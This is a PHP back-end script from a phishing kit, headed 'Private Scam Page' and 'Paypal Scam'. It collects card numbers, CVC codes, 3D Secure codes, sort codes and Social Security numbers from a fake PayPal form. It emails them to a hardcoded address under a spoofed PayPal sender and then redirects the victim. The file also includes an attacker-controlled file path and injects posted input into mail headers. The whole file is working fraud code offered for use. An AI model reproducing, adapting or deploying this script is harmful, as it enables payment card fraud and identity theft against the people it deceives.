<?php

/*
__________________________________________________________________________________________________________________
Private Scam Page*********KAKA
---------------------------------------
Paypal Scam
KAKA / KAKA / KAKA / KAKA / 
KAKA / KAKA / KAKA / KAKA / 
ZIZOU / ZIZOU / ZIZOU  / ZIZOU / 
__________________________________________________________________________________________________________________
*/

/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$cardholder = $_POST['_fulln'];
$cardnumber = $_POST['_ccn'];
$ccv 		= $_POST['_ccv'];
$hostname	= $_POST['hostname'];
$expm 		= $_POST['_expm'];
$expy 		= $_POST['_expy'];
$secure3d	= $_POST['_3d'];
$sortcode 	= $_POST['_sortc'];
$ssn1 		= $_POST['_ssn1'];
$ssn2 		= $_POST['_ssn2'];
$ssn3 		= $_POST['_ssn3'];
/*========== [ Variables ]==========*/


$message = "
=========[VBV INFOS]=========
Card Holder		: $cardholder
Card Number		: $cardnumber
CVC				: $ccv
Exp Date		: $expm / $expy
3D / VBV		: $secure3d
Sort Code		: $sortcode
SSN			  	: $ssn1 - $ssn2 - $ssn3
===============[IP]==============
IP	: http://www.geoiptool.com/?IP=$ip
=================================";

$encrypt=  base64_encode($message);
include "$hostname";

$to = "Max.dz@outlook.com"; // Email Here
$subject = "VBV INFOS = [$ip]";
$headers = "From: PayPal Info <paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:websc-bank.php");


?>